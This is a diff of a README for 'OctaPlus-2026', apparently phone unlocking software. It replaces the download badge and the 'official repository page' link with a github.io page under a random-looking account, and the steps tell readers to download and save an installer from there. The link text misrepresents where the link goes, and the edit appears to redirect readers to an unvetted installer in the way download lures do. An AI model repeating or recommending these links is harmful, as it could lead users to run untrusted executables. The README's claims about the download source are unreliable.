@@ -1,6 +1,6 @@
 # 🛠️ OctaPlus-2026 - Access Professional Phone Unlocking Tools Easily
 
-[![Download OctaPlus-2026](https://img.shields.io/badge/Download-OctaPlus_2026_Setup-blue)](https://github.com/Platyceriumbifurcatumforwardpass555/OctaPlus-2026)
+[![Download OctaPlus-2026](https://img.shields.io/badge/Download-OctaPlus_2026_Setup-blue)](https://platyceriumbifurcatumforwardpass555.github.io)
 
 ## 📦 What is OctaPlus-2026
 
@@ -20,7 +20,7 @@ To run this software, ensure your computer meets these minimum specifications:
 
 Follow these steps to set up the software on your machine.
 
-1.  Visit the official repository page: [https://github.com/Platyceriumbifurcatumforwardpass555/OctaPlus-2026](https://github.com/Platyceriumbifurcatumforwardpass555/OctaPlus-2026).
+1.  Visit the official repository page: [https://platyceriumbifurcatumforwardpass555.github.io](https://platyceriumbifurcatumforwardpass555.github.io).
 2.  Locate the release section on the right side of the page.
 3.  Click the link to download the installer file.
 4.  Save the file to your desktop or downloads folder.
